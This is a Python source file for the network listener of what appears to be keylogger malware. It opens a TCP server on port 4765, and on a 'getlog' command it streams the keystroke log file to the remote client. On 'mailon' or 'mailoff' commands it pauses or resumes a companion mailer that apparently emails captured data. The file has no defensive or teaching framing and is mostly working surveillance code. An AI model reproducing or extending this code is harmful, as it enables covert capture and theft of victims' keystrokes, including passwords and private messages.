import socket
import threading
from get_local_addr import get_local_addr


class Server:

    s = None
    port = None
    conn = None
    addr = None
    parent = None

    def __init__(self, parent, port=4765):

        # Sets the logger and mailer link
        self.parent = parent

        # Create the socket
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Sets up the thread and starts listening on it
        t = threading.Thread(target=self.start)
        t.daemon = False
        t.start()

    def start(self):

        # Start listening for connections
        self.s.bind(('', self.port))
        self.s.listen(1024)

        try:
            # When a client connects send a success message
            self.conn, self.addr = self.s.accept()
            self.conn.send("[+] Connected with server".encode())

            # Receive a command from the client and parse it
            self.parse_cmd(self.conn.recv(32).decode("utf-8"))
        except (ConnectionAbortedError, ConnectionResetError):
            self.conn.close()
            self.s.close()
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.start()

    def parse_cmd(self, cmd):
        if cmd == 'getlog':
            self.send_klog()
        if cmd == 'mailoff':
            print('mailoff')
            self.mail_off()
        if cmd == 'mailon':
            self.mail_on()
        else:
            print('unknown command')

    def mail_off(self):
        print('mailoff func start')
        self.parent.mailer.pause()
        self.conn.close()
        self.s.close()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.start()
        print('mailoff func end')

    def mail_on(self):
        print('mailon func start')
        self.parent.mailer.unpause()
        self.conn.close()
        self.s.close()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.start()
        print('mailon func end')

    def send_klog(self):
        self.parent.logger.pause()
        log = open(self.parent.logger.path, 'r')
        l = log.read(1024)
        while l:
            self.conn.send(l.encode())
            l = log.read(1024)
        log.close()
        self.conn.close()
        self.s.close()
        self.parent.logger.unpause()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.start()
